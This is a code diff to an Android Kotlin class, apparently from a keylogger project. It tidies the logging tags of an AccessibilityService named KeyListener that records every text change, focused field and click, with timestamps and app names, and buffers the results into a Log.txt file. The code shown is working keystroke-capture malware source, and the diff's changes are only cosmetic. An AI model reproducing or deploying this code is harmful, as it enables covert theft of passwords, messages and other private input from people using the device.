@@ -14,10 +14,12 @@ import java.text.DateFormat
 import java.text.SimpleDateFormat
 import java.util.*
 
+const val TAG = "MY NOTE"
 class KeyListener : AccessibilityService() {
+
     var res = ""
     public override fun onServiceConnected() {
-        Log.v("Connected :", "Onservice() Connected...")
+        Log.v(TAG, "Onservice() Connected...")
         val info = AccessibilityServiceInfo()
         info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
         info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
@@ -29,7 +31,6 @@ class KeyListener : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         val df: DateFormat = SimpleDateFormat("dd MMM, hh:mm ")
         val time = df.format(Calendar.getInstance().time)
-        Log.e("Meow: ", "$time|(TEXT)|meow")
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 var data = event.text.toString()
@@ -38,7 +39,7 @@ class KeyListener : AccessibilityService() {
                 $res$data
                 
                 """.trimIndent()
-                Log.v("OP: ", "$time|(TEXT)|$data")
+                Log.v(TAG, "$time|(TEXT)|$data")
             }
             AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                 var data = event.text.toString()
@@ -47,7 +48,7 @@ class KeyListener : AccessibilityService() {
                     $res$data
                     
                     """.trimIndent()
-                Log.v("OP: ", "$time|(FOCUSED)|$data")
+                Log.v(TAG, "$time|(FOCUSED)|$data")
             }
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 var data = event.text.toString()
@@ -56,7 +57,7 @@ class KeyListener : AccessibilityService() {
                     $res$data
                     
                     """.trimIndent()
-                Log.v("OP: ", time + "|(CLICKED)|" + event.packageName.toString() + data)
+                Log.v(TAG, time + "|(CLICKED)|" + event.packageName.toString() + data)
                 if (res.length > 1000) {
                     try {
                         val file = File(applicationContext.getExternalFilesDir(null), "Log.txt")
